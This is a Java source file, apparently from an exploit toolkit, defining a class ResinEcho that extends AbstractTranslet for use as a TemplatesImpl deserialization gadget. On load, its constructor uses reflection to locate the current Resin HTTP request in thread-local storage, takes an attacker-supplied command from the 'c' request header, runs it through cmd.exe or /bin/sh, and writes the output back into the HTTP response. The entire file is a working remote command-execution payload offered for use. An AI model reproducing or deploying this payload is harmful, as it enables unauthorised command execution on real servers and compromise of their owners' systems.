package com.sorry.utils.templatesimpl;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.PrintWriter;
import java.lang.reflect.Field;

/**
 * created by 0x22cb7139 on 2021/7/27
 *
 */
public class ResinEcho extends AbstractTranslet {
    public ResinEcho() throws Exception {
        boolean flag = false;
        Thread[] threads = (Thread[])getFV(Thread.currentThread().getThreadGroup(), "threads");
        for(int i = 0; i < threads.length; ++i) {
            Thread thread = threads[i];
            if (thread != null) {
                String name = thread.getName();
                if(getFV(thread,"threadLocals")!=null){
                    Object[]  tables = (Object[]) getFV(getFV(thread,"threadLocals"),"table");
                    for(int j=0;j<tables.length;j++){
                        if(tables[j]!=null){
                            if(getFV(tables[j],"value")!=null){
                                if(getFV(tables[j],"value").getClass().getName().equals("com.caucho.server.http.HttpRequest")){
                                    Object request = getFV(tables[j],"value");
                                    Object response = request.getClass().getMethod("getResponse",new Class[0]).invoke(request,new Object[0]);
                                    String cmd = (String) request.getClass().getMethod("getHeader",new Class[]{String.class}).invoke(request, new Object[]{new String("c")});
                                    if (cmd != null && !cmd.isEmpty()) {
                                        String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
                                        writeBody(response,(new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream())).useDelimiter("\\A").next());
                                        flag = true;
                                    }
                                }
                                if(flag) {break;}
                            }
                        }
                    }
                    if(flag) {break;}
                }
            }
        }
    }

    public static Object getFV(Object obj,String fieldName) throws Exception{
        java.lang.reflect.Field f0 = null;
        Class clas = obj.getClass();
        while (clas != Object.class){
            try{
                f0 = clas.getDeclaredField(fieldName);
                break;
            } catch (NoSuchFieldException e){
                clas = clas.getSuperclass();
            }
        }

        if (f0 != null){
            f0.setAccessible(true);
            return f0.get(obj);
        }else {
            throw new NoSuchFieldException(fieldName);
        }
    }

    private static void writeBody(Object response, String result) throws Exception {
        try{
            response.getClass().getMethod("setContentLength", new Class[]{Integer.TYPE}).invoke(response,new Object[]{new Integer(result.getBytes().length)});
            java.io.PrintWriter writer = (java.io.PrintWriter) response.getClass().getMethod("getWriter", new Class[0]).invoke(response,new Object[0]);
            writer.write(result);
            writer.flush();
            writer.close();
        }catch (NoSuchMethodException e){
            response.getClass().getMethod("setHeader",new Class[]{String.class,String.class}).invoke(response,new Object[]{"Content-Length",result.getBytes().length+""});
            java.lang.reflect.Method method = response.getClass().getDeclaredMethod("createResponseStream",new Class[0]);
            method.setAccessible(true);
            Object AbstractResponseStream = method.invoke(response,new Object[0]);
            AbstractResponseStream.getClass().getMethod("write",new Class[]{byte[].class, Integer.TYPE, Integer.TYPE}).invoke(AbstractResponseStream,new Object[]{result.getBytes(), new Integer(0), new Integer(result.getBytes().length)});
            AbstractResponseStream.getClass().getMethod("close",new Class[0]).invoke(AbstractResponseStream,new Object[0]);
        }

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }


}
